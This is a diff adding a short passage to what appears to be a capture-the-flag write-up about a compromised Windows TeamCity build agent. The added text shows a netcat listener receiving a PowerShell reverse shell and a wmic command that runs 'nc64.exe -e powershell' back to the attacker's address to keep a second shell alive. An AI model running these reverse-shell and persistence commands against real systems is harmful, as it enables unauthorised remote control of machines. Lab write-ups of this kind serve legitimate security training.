@@ -646,6 +646,29 @@ Ill open another listener on port 1338
 Then ill re run the process to get the initial shell
 
 ```python
+❯❯❯ rlwrap nc -lnvp 1337
+listening on [any] 1337 ...
+connect to [10.10.14.61] from (UNKNOWN) [10.129.229.190] 63914
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\TeamCity\buildAgent\work\74c2f03019966b3e> wmic process call create "C:\ProgramData\nc64.exe -e powershell 10.10.14.61 1338"
+wmic process call create "C:\ProgramData\nc64.exe -e powershell 10.10.14.61 1338"
+Executing (Win32_Process)->Create()
+Method execution successful.
+Out Parameters:
+instance of __PARAMETERS
+{
+	ProcessId = 5296;
+	ReturnValue = 0;
+};
+
+PS C:\TeamCity\buildAgent\work\74c2f03019966b3e> 
+```
+
+Then after getting the shell ill use wmic to run netcat under another process, this means that when this process times out the new shell on port 1338 should remain alive
+
+```python
 
 ```
 
